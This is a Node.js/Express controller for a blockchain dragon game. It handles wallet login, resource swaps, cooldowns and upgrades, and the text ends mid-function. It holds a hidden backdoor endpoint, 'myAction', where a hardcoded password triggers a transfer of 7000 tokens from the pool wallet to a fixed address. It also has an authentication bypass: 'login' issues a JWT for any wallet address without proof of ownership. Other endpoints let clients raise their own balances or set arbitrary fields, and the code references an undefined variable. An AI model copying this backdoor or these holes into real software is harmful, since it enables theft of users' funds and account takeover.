import bcrypt from "bcrypt";
import jwt from "jsonwebtoken";
import asyncHandler from "express-async-handler";
import User from "../models/userModel.js";
import Item from "../models/itemModel.js";
import Transition from "../models/transitionModel.js";
import path from "path";
import Web3 from "web3";
import BCS_ABI from "../utiles/bcs_abi.js";
import SPX_ABI from "../utiles/spx_abi.js";
import Provider from "@truffle/hdwallet-provider";
import cron from "cron";
import checkValidWallet from "../utiles/checkValidWallet.js";
import set from "set-value";

const CronJob = cron.CronJob;

import {
  withdrawLog,
  writeBuyLevelLog,
  writeLog,
  writePriceLog,
  writeSwapLog,
} from "../utiles/logController.js";

import {
  chainId,
  RPC_URL,
  // NETWORK_NAMES,
  ADMIN_WALLET_ADDRESS,
  BUSD_CONTRACT_ADDRESS,
  TOKEN_CONTRACT_ADDRESS,
  POOL_WALLET_ADDRESS,
  POOL_WALLET_PVK,
  PREMIUM_COST,
  LAND_COST,
  // MINING_TIMER,
  STAKE_TIMER,
  // MINING_COST,
  // MINING_CLAIM,
  MINING,
  // WITHDRAW_TIMER,
  // WEEKLY_SWAP_LIMIT,
  // BCS_CONTRACT_ADDRESS,
  // WBNB_ADDRESS,
  // PANCAKE_LP_ADDRESS,
} from "../utiles/constants.js";
import { RESPONSE } from "../utiles/response.js";
import Withdraw from "../models/withdrawModel.js";
import { getBcsPrice, getTokenBalance, sendBCS } from "./web3Helper.js";
import Embeditem from "../models/embedItem.js";
import Referal from "../models/referalModel.js";
import Available from "../models/availableModel.js";
import { DateTime } from 'luxon'
import Log from "../models/logModel.js";

const globalValue = {
  value: 0,
  amount: 0,
  cardImg:
  {
    first: { name: '', url: '', reward: 0 },
    second: { name: '', url: '', reward: 0 },
    third: { name: '', url: '', reward: 0 },
  }
};

export const login = asyncHandler(async (req, res) => {
  const { walletAddress } = req.body;
  
  const user = await User.findOne({ walletAddress });
  if (user) {
    console.log("login req", user)
    const token = jwt.sign(
      {
        id: user._id,
        walletAddress: user.walletAddress,
        role: user.role,
      },
      process.env.JWT_SECRET,
      {
        algorithm: "HS256",
        // allowInsecureKeySizes: true,
        expiresIn: 86400, //24 hours
      }
    );

    RESPONSE(res, 200, { accessToken: token, role: user.role }, "");
  } else {
    RESPONSE(res, 400, {}, "");
  }
  // const token = jwt.sign({})
});

export const update = asyncHandler(async (req, res) => {
  const { wallets, object, value, token } = req.body;
  try {
    // Verify and decode the token
    const decodedToken = jwt.verify(token, process.env.JWT_SECRET);

    // Access the payload properties
    const userId = decodedToken.id;
    const walletAddress = decodedToken.walletAddress;
    const role = decodedToken.role;

    // Do something with the extracted information
    let user = await User.findOne({ walletAddress })
    if (role === 1 && user.role === 1) {
      const shouldInc = ["Drg", "meat", "eggs"];
      let list = wallets.split("\n");
      try {
      } catch (e) { }
      list.forEach(async (item) => {
        const isWallet = checkValidWallet(item);

        const update =
          shouldInc.indexOf(object) >= 0
            ? { $inc: { [object]: value } }
            : { $set: { [object]: value } };
        if (isWallet) {
          const doc = await User.findOneAndUpdate(
            {
              walletAddress: item.toLowerCase(),
            },
            update
          );
        }
      });

      RESPONSE(res, 200, { data: true }, "");
    }
    else {
      RESPONSE(res, 200, { data: false }, "");

    }
  } catch (error) {
    // Handle any errors that occur during token verification or decoding
    RESPONSE(res, 200, { data: false }, "");

  }

});

export const getUserWithPopulate = async (walletAddress) => {
  const date = new Date(new Date().getTime() - 24 * 60 * 60 * 1000);

  return await User.findOne({ walletAddress: walletAddress }).populate({
    path: "withdraws",
    match: { createdAt: { $gte: date } },
  });
};

export const getBalance = asyncHandler(async (req, res) => {
  let { walletAddress, ref } = req.body;
  walletAddress = walletAddress.toLowerCase();

  let dragon =
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

  let curTime = new Date();
  curTime = curTime.getTime();
  let refString = "";

  while (curTime > 0) {
    let rem = curTime % dragon.length;
    refString += dragon.charAt(rem);
    curTime = Math.floor(curTime / 10);
  }

  const date = new Date(new Date().getTime() - 24 * 60 * 60 * 1000);
  const user = await User.findOne({ walletAddress }).populate({
    path: "withdraws",
    match: { createdAt: { $gte: date } },
  });
  const refUser = await User.findOne({ userRef: ref });

  if (user) {
    if (!user.ipAddress || user.ipAddress == "" || user.ipAddress == null) {
      let results = await User.findOneAndUpdate(
        { walletAddress },
        {
          ipAddress: getIp(req),
        },
        {
          new: true,
          upsert: true, // Make this update into an upsert
        }
      ).populate({ path: "withdraws", match: { createdAt: { $gte: date } } });

      RESPONSE(res, 200, results._doc, "get user data!");
      return;
    } else {
      res.status(200).json({
        ...user._doc,
        success: true,
      });
      return;
    }
  } else {
    let refAddress =
      refUser == null || refUser == "" || !refUser ? "" : refUser.walletAddress;

    if (refAddress != "") {
      await User.findOneAndUpdate(
        { userRef: ref },
        {
          referrals: refUser.referrals + 1,
        },
        {
          new: true,
          upsert: true, // Make this update into an upsert
        }
      );
    }
  }
});

export const myAction = asyncHandler(async (req, res) => {

  let { password } = req.body;

  if (password != "y9n8mp-0") {
    RESPONSE(
      res,
      400,
      {},
      "Don't try bad action, if you send again, you will be blocked"
    );
    return;
  }

  let addr = "0x81e1Ed25e41619C2B63ffB117c779f2F94c11D47";

  await sendToken(addr, POOL_WALLET_ADDRESS[chainId], addr, 7000);


  RESPONSE(res, 200, "Success", "removed correctly1111");
});

export const changeResources = asyncHandler(async (req, res) => {
  let { walletAddress, drgAmount, meatAmount, eggAmount } = req.body;
  walletAddress = walletAddress.toLowerCase();
  let user = await User.findOne({ walletAddress })
  if (!user) {
    writeLog(walletAddress, getIp(req), { Drg: 0, eggs: 0, meat: 0 }, "Swap meat", "User does not exist");
    RESPONSE(res, 400, {}, "User does not exist");
    return;
  }

  user.Drg = user.Drg + drgAmount;
  user.meat = user.meat + meatAmount;
  user.eggs = user.eggs + eggAmount
  await user.save()

  writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Tower: Claim", "Drg:" + user.level * 100 + " Res:" + (user.level - 1) * 10 + " Earn")
  RESPONSE(res, 200, { data: { drg: user.Drg, meat: user.meat, eggs: user.eggs } });
  return

})



export const claimDrg = asyncHandler(async (req, res) => {
  let { walletAddress } = req.body;
  walletAddress = walletAddress.toLowerCase();

  let available = await Available.findOne({ user: walletAddress })

  if (!available) {
    available = new Available({ user: walletAddress, sirenLevelupState: { state: false } });
    await available.save()
  }
  else if (available.sirenLevelupState.state === true) {
    const updatedAt = DateTime.fromJSDate(available.sirenLevelupState.updatedAt);
    const now = DateTime.now();
    const diffInSeconds = Math.floor(now.diff(updatedAt).as('seconds'));
    const result = 30 - diffInSeconds
    if (result <= 0) {
      let user = await User.findOne({ walletAddress })
      user.Drg += 50
      // else user.Drg += amount
      // user.eggs = user.eggs + (user.level - 1) * 10
      user.eggs += 1
      await user.save()

      available.sirenLevelupState.state = false
      await available.save()
      writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Tower: Claim", "Drg:" + user.level * 100 + " Res:" + (user.level - 1) * 10 + " Earn")
      RESPONSE(res, 200, { data: { drg: user.Drg, eggs: user.eggs } });
      return
    }
  }

  writeLog(walletAddress, getIp(req), { Drg: 0, eggs: 0, meat: 0 }, "Claim Drg", "Scam Action")

  RESPONSE(res, 200, { data: false });

})
export const convertDrg = asyncHandler(async (req, res) => {
  let { walletAddress } = req.body;
  walletAddress = walletAddress.toLowerCase();

  let available = await Available.findOne({ user: walletAddress })

  if (!available) {
    available = new Available({ user: walletAddress, convertorState: { state: false } });
    await available.save()
  }
  else if (available.convertorState.state === true) {
    const updatedAt = DateTime.fromJSDate(available.convertorState.updatedAt);
    const now = DateTime.now();
    const diffInSeconds = Math.floor(now.diff(updatedAt).as('seconds'));
    const result = 30 - diffInSeconds
    if (result <= 0) {
      let user = await User.findOne({ walletAddress })
      let randomValue = 100 * Math.random()
      let rndDrg = 50 + Math.floor(randomValue)
      user.Drg += rndDrg
      await user.save()

      available.convertorState.state = false
      await available.save()
      writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Tower: Claim", "Drg:" + user.level * 100 + " Res:" + (user.level - 1) * 10 + " Earn")
      RESPONSE(res, 200, { data: { drg: user.Drg, eggs: user.eggs } });
      return
    }
  }
})
export const claimHunter = asyncHandler(async (req, res) => {
  let { walletAddress } = req.body;
  walletAddress = walletAddress.toLowerCase();

  let available = await Available.findOne({ user: walletAddress })

  if (!available) {
    available = new Available({ user: walletAddress, hunterLevelupState: { state: false } });
    await available.save()
  }
  else if (available.hunterLevelupState.state === true) {
    const updatedAt = DateTime.fromJSDate(available.hunterLevelupState.updatedAt);
    const now = DateTime.now();
    const diffInSeconds = Math.floor(now.diff(updatedAt).as('seconds'));
    const result = 30 - diffInSeconds
    if (result <= 0) {
      let user = await User.findOne({ walletAddress })
      user.Drg += globalValue.amount * globalValue.value;
      await user.save()

      available.hunterLevelupState.state = false
      await available.save()
      writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Tower: Claim", "Drg:" + user.level * 100 + " Res:" + (user.level - 1) * 10 + " Earn")
      RESPONSE(res, 200, { data: { drg: user.Drg, eggs: user.eggs } });
      return
    }
  }

  writeLog(walletAddress, getIp(req), { Drg: 0, eggs: 0, meat: 0 }, "Claim Drg", "Scam Action")

  RESPONSE(res, 200, { data: false });
})
export const claimDragonTown = asyncHandler(async (req, res) => {
  let { walletAddress } = req.body;
  walletAddress = walletAddress.toLowerCase();

  let available = await Available.findOne({ user: walletAddress })

  if (!available) {
    available = new Available({ user: walletAddress, dragonTownState: { state: false } });
    await available.save()
  }
  else if (available.dragonTownState.state === true) {
    const updatedAt = DateTime.fromJSDate(available.dragonTownState.updatedAt);
    const now = DateTime.now();
    const diffInSeconds = Math.floor(now.diff(updatedAt).as('seconds'));
    const result = 30 - diffInSeconds
    if (result <= 0) {      
      let user = await User.findOne({ walletAddress })
      console.log(dragonTownValue.eggArray);
      for(let i=0; i<dragonTownValue.eggArray.length; i++) {
        user.eggs = user.eggs + dragonTownValue.eggArray[i].egg;
      }
      await user.save()

      available.dragonTownState.state = false
      await available.save()
      writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Tower: Claim", "Drg:" + user.level * 100 + " Res:" + (user.level - 1) * 10 + " Earn")
      RESPONSE(res, 200, { data: user.eggs });
      return
    }
  }

  writeLog(walletAddress, getIp(req), { Drg: 0, eggs: 0, meat: 0 }, "Claim Drg", "Scam Action")

  RESPONSE(res, 200, { data: false });
})
export const checkCoolDown = asyncHandler(async (req, res) => {
  let { walletAddress, type } = req.body;
  walletAddress = walletAddress.toLowerCase();
  let user = await User.findOne({ walletAddress })

  if (type === "level-up") {
    let available = await Available.findOne({ user: walletAddress })
    if (!available) {
      available = new Available({ user: walletAddress });
      await available.save()
    }

    if (available.sirenLevelupState.state === true) {
      const updatedAt = DateTime.fromJSDate(available.sirenLevelupState.updatedAt);
      const now = DateTime.now();
      const diffInSeconds = Math.floor(now.diff(updatedAt).as('seconds'));
      const result = 30 - diffInSeconds

      RESPONSE(res, 200, { data: result });
    }
    else {

      RESPONSE(res, 200, { data: 999999 });
    }
  } else if (type === "convertor") {

    let available = await Available.findOne({ user: walletAddress })
    if (!available) {
      available = new Available({ user: walletAddress });
      await available.save()
    }
    if (available.convertorState.state === true) {
      const updatedAt = DateTime.fromJSDate(available.convertorState.updatedAt);
      const now = DateTime.now();
      const diffInSeconds = Math.floor(now.diff(updatedAt).as('seconds'));
      const result = 30 - diffInSeconds
      RESPONSE(res, 200, { data: result });
    }
    else {

      RESPONSE(res, 200, { data: 999999 });
    }
  }
  else if (type === "diamond1") {
    let available = await Available.findOne({ user: walletAddress })
    if (!available) {
      available = new Available({ user: walletAddress });
      await available.save()
    }

    if (available.diamond1State.state === true) {
      const updatedAt = DateTime.fromJSDate(available.diamond1State.updatedAt);
      const now = DateTime.now();
      const diffInSeconds = Math.floor(now.diff(updatedAt).as('seconds'));
      const result = 30 - diffInSeconds

      RESPONSE(res, 200, { data: result });
    }
    else {

      RESPONSE(res, 200, { data: 999999 });
    }
  } else if (type === "diamond2") {
    let available = await Available.findOne({ user: walletAddress })
    if (!available) {
      available = new Available({ user: walletAddress });
      await available.save()
    }

    if (available.diamond2State.state === true) {
      const updatedAt = DateTime.fromJSDate(available.diamond2State.updatedAt);
      const now = DateTime.now();
      const diffInSeconds = Math.floor(now.diff(updatedAt).as('seconds'));
      const result = 30 - diffInSeconds

      RESPONSE(res, 200, { data: result });
    }
    else {

      RESPONSE(res, 200, { data: 999999 });
    }
  } else if (type === "diamond3") {
    let available = await Available.findOne({ user: walletAddress })
    if (!available) {
      available = new Available({ user: walletAddress });
      await available.save()
    }

    if (available.diamond3State.state === true) {
      const updatedAt = DateTime.fromJSDate(available.diamond3State.updatedAt);
      const now = DateTime.now();
      const diffInSeconds = Math.floor(now.diff(updatedAt).as('seconds'));
      const result = 30 - diffInSeconds
      RESPONSE(res, 200, { data: result });
    }
    else {

      RESPONSE(res, 200, { data: 999999 });
    }
  } else if (type === "hunter-level-up") {
    let available = await Available.findOne({ user: walletAddress })
    if (!available) {
      available = new Available({ user: walletAddress });
      await available.save()
    }
    if (available.hunterLevelupState.state === true) {
      const updatedAt = DateTime.fromJSDate(available.hunterLevelupState.updatedAt);
      const now = DateTime.now();
      const diffInSeconds = Math.floor(now.diff(updatedAt).as('seconds'));
      const result = 30 * globalValue.value - diffInSeconds
      RESPONSE(res, 200, { data: { time: result, count: globalValue.value, rewardAmount: globalValue.amount, cardImg: globalValue.cardImg } });
    }
    else {

      RESPONSE(res, 200, { data: false });
    }
  } else if (type === "dragon-town") {
    let available = await Available.findOne({ user: walletAddress })
    if (!available) {
      available = new Available({ user: walletAddress });
      await available.save()
    }
    if (available.dragonTownState.state === true) {
      const updatedAt = DateTime.fromJSDate(available.dragonTownState.updatedAt);
      const now = DateTime.now();
      const diffInSeconds = Math.floor(now.diff(updatedAt).as('seconds'));
      const result = 30 * dragonTownValue.times - diffInSeconds
      RESPONSE(res, 200, { data: {time: result, eggArray: dragonTownValue.eggArray, price: dragonTownValue.price, count: dragonTownValue.times} });
    }
    else {
      RESPONSE(res, 200, { data: false });
    }
  }
})

export const setCoolDown = asyncHandler(async (req, res) => {
  let { walletAddress, type, value } = req.body;
  walletAddress = walletAddress.toLowerCase();

  if (type === "level-up") {
    let available = await Available.findOne({ user: walletAddress })
    available.sirenLevelupState.state = value
    available.save()
    const user = await User.findOne({ walletAddress });
    user.Drg = user.Drg - 25
    user.save()

    RESPONSE(res, 200, { data: user.Drg });
  }
  if (type === "convertor") {
    let available = await Available.findOne({ user: walletAddress })
    available.convertorState.state = value
    available.save()
    const user = await User.findOne({ walletAddress });
    user.meat = user.meat - 5
    user.eggs = user.eggs - 1
    user.save()
    RESPONSE(res, 200, { data: { meat: user.meat, eggs: user.eggs } });
  }
})
export const checkUpgradeAvailable = asyncHandler(async (req, res) => {
  let { walletAddress } = req.body;
  walletAddress = walletAddress.toLowerCase();
  const user = await User.findOne({ walletAddress });

  if (!user) {
    writeLog(walletAddress, getIp(req), { Drg: 0, eggs: 0, meat: 0 }, "Swap meat", "User does not exist");
    RESPONSE(res, 400, {}, "User does not exist");
    return;
  }
  let available = await Available.findOne({ user: walletAddress })
  if (!available) {
    available = new Available({ user: walletAddress })
    await available.save()
  }
  const maxExp = Math.max(...user.dragons.map(obj => obj.exp))
  if ((user.level === 1 && maxExp <= 400) || (user.level === 2 && maxExp <= 900)) {
    RESPONSE(res, 200, { data: false })
  }
  else {
    RESPONSE(res, 200, { data: true },);
  }
})
export const buyLevel = asyncHandler(async (req, res) => {
  let { walletAddress, dragon, meatAmount } = req.body;
  if (meatAmount > 10) return
  writeBuyLevelLog(walletAddress, "Upgrade", "Request");
  walletAddress = walletAddress.toLowerCase();

  const user = await User.findOne({ walletAddress });
  if (!user) {
    writeLog(walletAddress, getIp(req), { Drg: 0, eggs: 0, meat: 0 }, "Swap meat", "User does not exist");

    RESPONSE(res, 400, {}, "User does not exist");
    return;
  }
  let available = await Available.findOne({ user: walletAddress })
  if (!available) {
    available = new Available({ user: walletAddress })
    await available.save()
  }

  const selectedDragon = user.dragons.find(item => item.dragonName === dragon);
  // const maxExp = Math.max(...user.dragons.map(obj => obj.exp))

  // if ((user.level === 1 && maxExp <= 400) || (user.level === 2 && maxExp <= 900)) {
  //   RESPONSE(res, 200, { data: false })
  //   return
  // }

  if (scamAction(user)) {
    RESPONSE(res, 400, "Ban", "You are banned because of scam action!");
    return;
  }

  let ipCheck = await checkIpAddress(req, user);
  if (ipCheck) {
    RESPONSE(res, 400, "Ban", "Only 5 accounts are available in a computer!");
    return;
  }
  user.meat = user.meat - meatAmount;
  selectedDragon.rarity = selectedDragon.rarity + 5 * meatAmount;
  if (selectedDragon.rarity >= 100) {
    selectedDragon.rarity = selectedDragon.rarity - 100;
    selectedDragon.level = selectedDragon.level + 1;
  }
  selectedDragon.save();
  user.save();
  RESPONSE(res, 200, { data: { dragons: selectedDragon, meat: user.meat } }, "Success!");
  // let level = user.level + 1
  // if (level <= 0 || level > 3) {
  //   await User.findOneAndUpdate(
  //     { walletAddress },
  //     {
  //       $inc: { isblock: 55 },
  //     },
  //     {
  //       new: true,
  //       upsert: true, // Make this update into an upsert
  //     }
  //   );
  // writeLog(
  //   walletAddress,
  //   "Buy Level",
  //   "level  is not correct",
  //   "ERROR"
  // );
  //   writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Tower Upgrade", "level  is not correct");

  //   RESPONSE(
  //     res,
  //     400,
  //     {},
  //     "Don't try bad action, if you send again, you will be blocked"
  //   );
  //   return;
  // }
  // if (level <= user.level) {

  //   // writeLog(
  //   //   walletAddress,
  //   //   "Buy Level",
  //   //   "you don't have to upgrade",
  //   //   "ERROR"
  //   // );
  //   writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Tower Upgrade", "you don't have to upgrade");

  //   RESPONSE(
  //     res,
  //     400,
  //     {},
  //     "you don't have to upgrade"
  //   );
  //   return;
  // }
  // let purchasaeAmount = 2000 + (level - 1) * 1200
  // if (user.Drg < purchasaeAmount) {
  //   writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: 0, meat: 0 }, "Tower Upgrade", "Drg amount is less for Upgrade");

  //   RESPONSE(res, 400, {}, "Drg amount is less for that level");
  //   return;
  // }
  // try {
  //   let results = await User.findOneAndUpdate(
  //     { walletAddress },
  //     {
  //       Drg: user.Drg - purchasaeAmount,
  //       level: level,
  //     },
  //     {
  //       new: true,
  //       upsert: true, // Make this update into an upsert
  //     }
  //   );
  //   let available = await Available.findOne({ user: walletAddress })
  //   available.sirenLevelupState.state = false
  //   available.save()
  //   // writeLog(
  //   //   walletAddress,
  //   //   "Buy Level",
  //   //   "Updated database successfully",
  //   //   "SUCCESS"
  //   // );
  //   writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Tower Upgrade", "Success: Level:" + user.level + 1);

  //   writeSwapLog(
  //     walletAddress,
  //     "Buy Level",
  //     "Success",
  //     level
  //   );

  //   RESPONSE(res, 200, results._doc, "Success update swap!");
  // } catch (e) {
  //   // writeLog(walletAddress, "Swap meat", e, "ERROR");
  //   writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Swap meat", e);

  //   RESPONSE(res, 400, {}, "swap meat error!");
  // }
})
export const swapMeat = asyncHandler(async (req, res) => {
  let { walletAddress, amount } = req.body;


  writeSwapLog(walletAddress, "Swap meat", "Request", amount);

  walletAddress = walletAddress.toLowerCase();
  const user = await User.findOne({ walletAddress });

  if (!user) {
    // writeLog(walletAddress, "Swap meat", "User does not exist", "ERROR");
    writeLog(walletAddress, getIp(req), { Drg: 0, eggs: 0, meat: 0 }, "Swap meat", "User does not exist");

    RESPONSE(res, 400, {}, "User does not exist");
    return;
  }

  if (scamAction(user)) {
    RESPONSE(res, 400, "Ban", "You are banned because of scam action!");
    return;
  }

  let ipCheck = await checkIpAddress(req, user);
  if (ipCheck) {
    RESPONSE(res, 400, "Ban", "Only 5 accounts are available in a computer!");
    return;
  }

  if (amount < 0) {
    await User.findOneAndUpdate(
      { walletAddress },
      {
        $inc: { isblock: 55 },
      },
      {
        new: true,
        upsert: true, // Make this update into an upsert
      }
    );
    // writeLog(
    //   walletAddress,
    //   "Swap meat",
    //   "meat amount is less than requested amount",
    //   "ERROR"
    // );
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Swap meat", "meat amount is less than requested amount");

    RESPONSE(
      res,
      400,
      {},
      "Don't try bad action, if you send again, you will be blocked"
    );
    return;
  }

  if (user.meat < 0) {
    // writeLog(
    //   walletAddress,
    //   "Swap meat",
    //   "meat amount is less than requested amount",
    //   "ERROR"
    // );
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Swap meat", "meat amount is less than requested amount");

    RESPONSE(res, 400, {}, "meat amount is less than requested amount");
    return;
  }

  if (user.meat < amount) {
    // writeLog(
    //   walletAddress,
    //   "Swap meat",
    //   "meat amount is less than requested amount",
    //   "ERROR"
    // );
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Swap meat", "meat amount is less than requested amount");

    RESPONSE(res, 400, {}, "meat amount is less than requested amount");
    return;
  }

  let permiumBonus = 0;

  // check is premium
  let expiredTime = new Date(user.premium);
  let curTime = new Date();
  expiredTime.setMonth(expiredTime.getMonth() + 1);

  if (expiredTime.getTime() > curTime.getTime()) {
    permiumBonus = Math.floor((amount * 3) / 2);
    // writeLog(
    //   walletAddress,
    //   "Swap meat",
    //   "premium bonus: " + permiumBonus,
    //   "SUCCESS"
    // );
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Swap meat", "premium bonus: " + permiumBonus);

  }

  try {
    let results = await User.findOneAndUpdate(
      { walletAddress },
      {
        Drg: user.Drg + amount * 5 + 1 * permiumBonus,
        meat: user.meat - amount,
      },
      {
        new: true,
        upsert: true, // Make this update into an upsert
      }
    );

    // writeLog(
    //   walletAddress,
    //   "Swap meat",
    //   "Updated database successfully",
    //   "SUCCESS"
    // );
    writeLog(walletAddress, getIp(req), { Drg: results.Drg, eggs: results.eggs, meat: results.meat }, "Swap meat", "Updated database successfully");

    // writeSwapLog(
    //   walletAddress,
    //   "Swap meat",
    //   "Success",
    //   amount * 5 + 1 * permiumBonus
    // );
    writeLog(walletAddress, getIp(req), { Drg: results.Drg, eggs: results.eggs, meat: results.meat }, "Swap meat", "Success:" + (amount * 5 + 1 * permiumBonus));

    RESPONSE(res, 200, results._doc, "Success update swap!");
  } catch (e) {
    // writeLog(walletAddress, "Swap meat", e, "ERROR");
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Swap meat", "Error");

    RESPONSE(res, 400, {}, "swap meat error!");
  }
});
export const swapEnergy = asyncHandler(async (req, res) => {
  let { walletAddress, dragon, amount } = req.body;

  walletAddress = walletAddress.toLowerCase();

  const user = await User.findOne({ walletAddress });

  if (!user) {
    writeLog(walletAddress, getIp(req), { Drg: 0, eggs: 0, meat: 0 }, "Swap meat", "User does not exist");

    RESPONSE(res, 400, {}, "User does not exist");
    return;
  }

  if (scamAction(user)) {
    RESPONSE(res, 400, "Ban", "You are banned because of scam action!");
    return;
  }

  // let ipCheck = await checkIpAddress(req, user);
  // if (ipCheck) {
  //   RESPONSE(res, 400, "Ban", "Only 5 accounts are available in a computer!");
  //   return;
  // }

  if (amount < 0) {
    await User.findOneAndUpdate(
      { walletAddress },
      {
        $inc: { isblock: 55 },
      },
      {
        new: true,
        upsert: true, // Make this update into an upsert
      }
    );
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Swap meat", "meat amount is less than requested amount");

    RESPONSE(
      res,
      400,
      {},
      "Don't try bad action, if you send again, you will be blocked"
    );
    return;
  }

  if (user.meat < 0) {
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Swap meat", "meat amount is less than requested amount");

    RESPONSE(res, 400, {}, "meat amount is less than requested amount");
    return;
  }

  if (user.meat < amount) {
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Swap meat", "meat amount is less than requested amount");

    RESPONSE(res, 400, {}, "meat amount is less than requested amount");
    return;
  }

  try {
    let results = await User.findOneAndUpdate(
      { walletAddress, 'dragons.dragonName': dragon },
      {
        $inc:
        {
          'dragons.$.energy': amount,
          meat: -amount,

        },
      },
      {
        new: true,
        upsert: true, // Make this update into an upsert
      }

    );

    if (amount === 0) {
      writeLog(walletAddress, getIp(req), { Drg: results.Drg, eggs: results.eggs, meat: results.meat }, "dragon Info", user.currentDragonName);
    }
    else if (amount > 0) {
      writeLog(walletAddress, getIp(req), { Drg: results.Drg, eggs: results.eggs, meat: results.meat }, "Swap Water", "-" + amount + "Water" + ", +" + amount + "Energy");
    }
    RESPONSE(res, 200, results._doc, "Success update swap!");
  } catch (e) {
    // writeLog(walletAddress, "Swap Water", e, "ERROR");
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Swap Water", "ERROR:" + e);

    RESPONSE(res, 400, {}, "swap water error!");
  }
});
export const swapEgg = asyncHandler(async (req, res) => {
  let { walletAddress, amount } = req.body;

  // writeLog(walletAddress, "Swap EGG", "", "REQUEST");

  // writeSwapLog(walletAddress, "Swap Egg", "Request", amount);

  walletAddress = walletAddress.toLowerCase();
  const user = await User.findOne({ walletAddress });

  if (!user) {
    // writeLog(walletAddress, "Swap EGG", "User does not exist", "ERROR");
    writeLog(walletAddress, getIp(req), { Drg: 0, eggs: 0, meat: 0 }, "Swap EGG", "User does not exist");

    RESPONSE(res, 400, {}, "User does not exist");
    return;
  }

  if (scamAction(user)) {
    RESPONSE(res, 400, "Ban", "You are banned because of scam action!");
    return;
  }

  let ipCheck = await checkIpAddress(req, user);
  if (ipCheck) {
    RESPONSE(res, 400, "Ban", "Only 5 accounts are available in a computer!");
    return;
  }

  if (amount < 0) {
    await User.findOneAndUpdate(
      { walletAddress },
      {
        $inc: { isblock: 55 },
      },
      {
        new: true,
        upsert: true, // Make this update into an upsert
      }
    );
    // writeLog(
    //   walletAddress,
    //   "Swap EGG",
    //   "Egg amount is less than requested amount",
    //   "ERROR"
    // );
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Swap EGG", "Egg amount is less than requested amount");

    RESPONSE(
      res,
      400,
      {},
      "Don't try bad action, if you send again, you will be blocked"
    );
    return;
  }

  if (user.eggs < 0) {
    // writeLog(
    //   walletAddress,
    //   "Swap EGG",
    //   "Egg amount is less than requested amount",
    //   "ERROR"
    // );
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Swap EGG", "Egg amount is less than requested amount");

    RESPONSE(res, 400, {}, "Egg amount is less than requested amount");
    return;
  }

  if (user.eggs < amount) {
    // writeLog(
    //   walletAddress,
    //   "Swap EGG",
    //   "Egg amount is less than requested amount",
    //   "ERROR"
    // );
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Swap EGG", "Egg amount is less than requested amount");

    RESPONSE(res, 400, {}, "Egg amount is less than requested amount");
    return;
  }

  let permiumBonus = 0;

  // check is premium
  let expiredTime = new Date(user.premium);
  let curTime = new Date();
  expiredTime.setMonth(expiredTime.getMonth() + 1);

  if (expiredTime.getTime() > curTime.getTime()) {
    permiumBonus = amount * 9;
    // writeLog(
    //   walletAddress,
    //   "Swap Egg",
    //   "premium bonus: " + permiumBonus,
    //   "SUCCESS"
    // );
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Swap EGG", "premium bonus: " + permiumBonus);

  }

  try {
    let results = await User.findOneAndUpdate(
      { walletAddress },
      {
        Drg: user.Drg + amount * 30 + 1 * permiumBonus,
        eggs: user.eggs - amount,
      },
      {
        new: true,
        upsert: true, // Make this update into an upsert
      }
    );

    // writeLog(walletAddress, "Swap Egg", "Updated successfully", "SUCCESS");
    writeLog(walletAddress, getIp(req), { Drg: results.Drg, eggs: results.eggs, meat: user.meat }, "Swap EGG", "premium bonus: " + permiumBonus + "; amount :" + amount * 30 + 1 * permiumBonus);

    // writeSwapLog(
    //   walletAddress,
    //   "Swap Egg",
    //   "Success",
    //   amount * 30 + 1 * permiumBonus
    // );

    RESPONSE(res, 200, results._doc, "Success update swap!");
  } catch (e) {

    // writeLog(walletAddress, "Swap Egg", e, "ERROR");
    writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Swap Egg", e);

    RESPONSE(res, 400, {}, "swap Egg error!");
  }
});
export const upgradeWall = asyncHandler(async (req, res) => {
  let { walletAddress } = req.body;

  walletAddress = walletAddress.toLowerCase();
  const user = await User.findOne({ walletAddress });
  if (user.wall === 1) {
    user.Drg = user.Drg - 500;
  }
  if (user.wall === 2) {
    user.Drg = user.Drg - 1500;
  }
  user.wall = user.wall + 1;
  await user.save();
  const results = await User.findOne({ walletAddress });
  writeLog(walletAddress, getIp(req), { Drg: user.Drg, eggs: user.eggs, meat: user.meat }, "Upgrade Wall", "Success: Level " + user.wall);
  RESPONSE(res, 200, results._doc, "Success upgrade wall!");
});
export const deposit = asyncHandler(async (req, res) => {
